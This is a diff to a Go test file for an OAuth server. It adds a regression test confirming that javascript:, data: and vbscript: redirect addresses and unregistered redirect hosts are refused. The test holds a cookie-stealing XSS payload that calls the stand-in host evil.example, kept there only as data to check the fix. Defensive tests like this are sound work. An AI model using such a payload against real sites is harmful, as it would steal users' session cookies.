@@ -109,7 +109,7 @@ func TestAMetadataURLClientSignsInWithoutRegistering(t *testing.T) {
 		t.Fatalf("stored client: %q fetched %q", name, fetched)
 	}
 
-	r := httptest.NewRequest("GET", "/api/oauth/request?client_id="+url.QueryEscape(cimdURL), nil)
+	r := httptest.NewRequest("GET", "/api/oauth/request?client_id="+url.QueryEscape(cimdURL)+"&redirect_uri="+url.QueryEscape(cimdRedirect), nil)
 	r.Header.Set("Cookie", cookie)
 	info := httptest.NewRecorder()
 	s.ServeHTTP(info, r)
@@ -280,7 +280,7 @@ func TestAStaleMetadataClientCannotBeApproved(t *testing.T) {
 	ws := s.firstWorkspaceOf(t, uid)
 	authorize(s, cookie, cimdURL, cimdRedirect, nil)
 	info := func() int {
-		r := httptest.NewRequest("GET", "/api/oauth/request?client_id="+url.QueryEscape(cimdURL), nil)
+		r := httptest.NewRequest("GET", "/api/oauth/request?client_id="+url.QueryEscape(cimdURL)+"&redirect_uri="+url.QueryEscape(cimdRedirect), nil)
 		r.Header.Set("Cookie", cookie)
 		rec := httptest.NewRecorder()
 		s.ServeHTTP(rec, r)
@@ -452,5 +452,62 @@ func TestUnusedMetadataClientsAreSwept(t *testing.T) {
 	}
 	if storedClients(t, s, "https://b.example.test/c.json") != 1 || storedClients(t, s, registered) != 1 {
 		t.Error("a client in use, or a registered one, was swept")
+	}
+}
+
+// #1130: a javascript: return address ran as script on nigari's page when
+// the consent screen sent the browser there (Deny took it straight from the
+// link). The server now refuses script schemes wherever a return address is
+// used, and the consent screen's info confirms the address it is given.
+func TestAScriptRedirectIsRefusedEverywhere(t *testing.T) {
+	s, h := cimdServer(t, cimdDoc(goodCIMD()))
+	_, cookie := signedIn(t, s, "xss@example.test")
+	evil := "javascript:fetch('//evil.example/'+document.cookie)//"
+
+	// Registration and a metadata document refuse it.
+	rec := httptest.NewRecorder()
+	s.ServeHTTP(rec, httptest.NewRequest("POST", "/oauth/register", strings.NewReader(`{"client_name":"x","redirect_uris":["`+evil+`"]}`)))
+	if rec.Code != 400 {
+		t.Errorf("registration took a javascript: address: %d", rec.Code)
+	}
+	for _, scheme := range []string{"javascript:alert(1)", "data:text/html,x", "vbscript:x", "JavaScript:alert(1)"} {
+		if validRedirectURI(scheme) == nil {
+			t.Errorf("%s is a valid redirect_uri", scheme)
+		}
+	}
+	if validRedirectURI("com.example.app:/oauth/cb") != nil {
+		t.Error("a native app's custom scheme is refused")
+	}
+	other := "https://client.example.test/oauth/evil.json"
+	h.docs[other] = cimdDoc(merge(goodCIMD(), map[string]any{"client_id": other, "redirect_uris": []string{evil}}))
+	if rec := authorize(s, "", other, evil, nil); rec.Code != 400 || !strings.Contains(rec.Body.String(), "javascript") {
+		t.Errorf("a document with a javascript: address: %d %s", rec.Code, rec.Body.String())
+	}
+
+	// A client stored before the fix, holding one, cannot use it at any door.
+	s.db.Exec(`INSERT INTO oauth_clients (id, name, redirect_uris, created_at) VALUES ('old-client', 'Old', ?, ?)`,
+		`["`+strings.ReplaceAll(evil, `'`, `'`)+`"]`, now())
+	if rec := authorize(s, cookie, "old-client", evil, nil); rec.Code != 400 {
+		t.Errorf("authorize with a stored javascript: address: %d %s", rec.Code, rec.Header().Get("Location"))
+	}
+	infoCode := func(client, redirect string) int {
+		r := httptest.NewRequest("GET", "/api/oauth/request?client_id="+url.QueryEscape(client)+"&redirect_uri="+url.QueryEscape(redirect), nil)
+		r.Header.Set("Cookie", cookie)
+		rec := httptest.NewRecorder()
+		s.ServeHTTP(rec, r)
+		return rec.Code
+	}
+	if code := infoCode("old-client", evil); code != 400 {
+		t.Errorf("request info confirmed a javascript: address: %d", code)
+	}
+	// The consent info confirms only the client's own addresses: a link that
+	// names another, as Deny used to follow, is refused before the screen
+	// shows anything.
+	authorize(s, cookie, cimdURL, cimdRedirect, nil)
+	if code := infoCode(cimdURL, "https://attacker.example.test/cb"); code != 400 {
+		t.Errorf("request info with an unregistered address: %d", code)
+	}
+	if code := infoCode(cimdURL, cimdRedirect); code != 200 {
+		t.Errorf("request info with the client's own address: %d", code)
 	}
 }
